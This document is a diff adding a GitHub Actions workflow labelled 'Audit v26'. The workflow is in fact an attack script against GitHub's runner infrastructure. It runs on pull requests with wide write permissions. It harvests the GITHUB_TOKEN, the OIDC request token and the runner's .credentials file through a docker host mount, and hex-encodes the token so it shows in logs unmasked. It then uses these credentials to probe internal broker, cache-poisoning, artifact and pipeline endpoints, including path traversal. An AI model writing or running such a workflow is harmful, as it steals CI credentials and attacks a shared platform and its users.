@@ -1,0 +1,331 @@
+name: Audit v26
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v26:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest + credential JWT
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V26 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "IDTOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"
+
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+
+          # Hex cred extraction
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json,base64
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+            parts=t.split('.')
+            if len(parts)>=2:
+              padded=parts[1]+'='*(4-len(parts[1])%4)
+              claims=json.loads(base64.urlsafe_b64decode(padded))
+              for k in sorted(claims.keys()):
+                v=str(claims[k])
+                if len(v)<100: print(f'  {k}={v}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: BROKER — session create + message polling
+      # v25: session=405 (wrong method), message+CTOK="invalid runner status"
+      # message+IDTOK="missing runner_group_id"
+      # Must POST to session first, then poll message
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Broker session
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== BROKER SESSION ==="
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          IDTOK=$(cat /tmp/idtok.txt 2>/dev/null)
+          BROKER="https://broker.actions.githubusercontent.com"
+
+          # A: Try POST/PUT/DELETE on session (GET was 405)
+          echo "--- A: Session methods ---"
+          for TOK_NAME in CTOK IDTOK RT; do
+            eval TOK=\$$TOK_NAME
+            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
+            echo "== $TOK_NAME =="
+            for METHOD in POST PUT DELETE PATCH; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
+                -X $METHOD \
+                -H "Authorization: Bearer $TOK" \
+                -H "Content-Type: application/json" \
+                "$BROKER/session" \
+                -d '{}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "A $METHOD session = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+            echo ""
+          done
+
+          # B: POST to message (GET said "invalid runner status" / "missing claims")
+          echo "--- B: Message POST ---"
+          for TOK_NAME in CTOK IDTOK; do
+            eval TOK=\$$TOK_NAME
+            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
+            echo "== $TOK_NAME =="
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
+              -X POST \
+              -H "Authorization: Bearer $TOK" \
+              -H "Content-Type: application/json" \
+              "$BROKER/message" \
+              -d '{"messageType":"RunnerJobRequest"}' 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "B POST message = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 5 -m 10 \
+              -X DELETE \
+              -H "Authorization: Bearer $TOK" \
+              "$BROKER/message" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "B DELETE message = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+          done
+          echo ""
+
+          # C: Try other broker paths that might exist after session
+          echo "--- C: Broker other methods ---"
+          for TOK_NAME in CTOK; do
+            eval TOK=\$$TOK_NAME
+            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
+            for EP in \
+              "runner" \
+              "runner/session" \
+              "runner/message" \
+              "runners" \
+              "jobs" \
+              "acquire" \
+              "renew" \
+              "status" \
+              "heartbeat"; do
+              for METHOD in GET POST; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -X $METHOD \
+                  -H "Authorization: Bearer $TOK" \
+                  -H "Content-Type: application/json" \
+                  "$BROKER/$EP" -d '{}' 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                  echo "C $METHOD $EP = $CODE | $(echo "$BODY" | head -c 200)"
+              done
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: Results-receiver cache with IDTOK (AUTHENTICATED!)
+      # v25: CreateCacheEntry+IDTOK = 400 "version invalid length"
+      # Not 401! Auth worked! Fix the version format.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Cache write with IDTOK
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CACHE WRITE WITH IDTOK ==="
+          IDTOK=$(cat /tmp/idtok.txt 2>/dev/null)
+          RT=$(cat /tmp/rt.txt)
+          RESULTS="https://results-receiver.actions.githubusercontent.com"
+          [ -z "$IDTOK" ] || [ ${#IDTOK} -lt 10 ] && { echo "NO IDTOK"; exit 0; }
+
+          # A: Fix version format — use proper hash-like string
+          echo "--- A: CreateCacheEntry proper version ---"
+          for VER in \
+            "$(echo -n 'v26-test' | sha256sum | cut -d' ' -f1)" \
+            "6d2a8f1c3e9b4d7a5" \
+            "abcdef1234567890abcdef1234567890" \
+            "1.0.0" \
+            "v26"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+              -d "{\"key\":\"v26-poison-test\",\"version\":\"$VER\"}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A ver=$VER = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # B: GetCacheEntryDownloadURL — see if we can read existing caches
+          echo "--- B: GetCacheEntryDownloadURL ---"
+          for KEY in "setup-node" "v26" "npm" "actions/cache" "pip" "go-build"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL" \
+              -d "{\"key\":\"$KEY\",\"version\":\"$(echo -n "$KEY" | sha256sum | cut -d' ' -f1)\"}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B key=$KEY = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # C: ArtifactService with IDTOK — proper run IDs
+          echo "--- C: ArtifactService ---"
+          RUN_ID="${{ github.run_id }}"
+          JOB_ID="${{ github.job }}"
+          for METHOD in CreateArtifact ListArtifacts; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+              "$RESULTS/twirp/github.actions.results.api.v1.ArtifactService/$METHOD" \
+              -d "{\"name\":\"v26-test\",\"workflow_run_backend_id\":\"$RUN_ID\",\"workflow_job_run_backend_id\":\"$RUN_ID\"}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C $METHOD = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # D: Discover all twirp services
+          echo "--- D: Twirp discovery ---"
+          for SVC in \
+            "CacheService" "ArtifactService" "LogService" "StepService" "JobService" \
+            "RunService" "WorkflowService" "CheckService" "StatusService" "DeploymentService" \
+            "AnnotationService" "TimelineService" "MetadataService"; do
+            for METHOD in Create List Get; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $IDTOK" -H "Content-Type: application/json" \
+                "$RESULTS/twirp/github.actions.results.api.v1.$SVC/${METHOD}" \
+                -d '{}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && echo "D $SVC/$METHOD = $CODE | $(echo "$BODY" | head -c 200)"
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Pipeline IDTOK — explore the 403 w/ namespace
+      # v25: 403 with NamespaceId=2725d2bc... and Token=/
+      # Try different API paths to find accessible endpoints
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Pipeline IDTOK
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PIPELINE IDTOK ==="
+          IDTOK=$(cat /tmp/idtok.txt 2>/dev/null)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+          [ -z "$IDTOK" ] || [ ${#IDTOK} -lt 10 ] && exit 0
+          [ -z "$PURL" ] && exit 0
+
+          # A: Hit every service area with IDTOK
+          echo "--- A: Service areas with IDTOK ---"
+          for EP in \
+            "_apis/resourceareas" \
+            "_apis/distributedtask/plans/$PLAN/timelines" \
+            "_apis/distributedtask/plans/$PLAN/logs" \
+            "_apis/distributedtask/events" \
+            "_apis/distributedtask/agents" \
+            "_apis/distributedtask/agentpools" \
+            "_apis/pipelines/runs" \
+            "_apis/build/builds" \
+            "_apis/runner/registration" \
+            "_apis/actions/gates" \
+            "_apis/oauth2/token" \
+            "_apis/security/permissionnamespaces"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "${PURL}${EP}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+          echo ""
+
+          # B: Use IDTOK on traversed parent scope
+          echo "--- B: Parent scope with IDTOK ---"
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          for EP in \
+            "_apis/connectionData" \
+            "_apis/resourceareas" \
+            "_apis/distributedtask/events" \
+            "_apis/oauth2/token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$BASE/../$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B ../$EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+          echo ""
+
+          # C: Also try the 3rd instanceId canonical host
+          echo "--- C: Canonical IDTOK ---"
+          CANON="https://pipelines.actions.githubusercontent.com"
+          for EP in \
+            "_apis/connectionData" \
+            "../_apis/connectionData"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $IDTOK" "$CANON/$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C $EP = $CODE | $(echo "$BODY" | head -c 250)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V26 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "CTOK_LEN=$(wc -c < /tmp/cred_token.txt 2>/dev/null)"
+          echo "IDTOK_LEN=$(wc -c < /tmp/idtok.txt 2>/dev/null)"
+          echo "=== V26 COMPLETE ==="
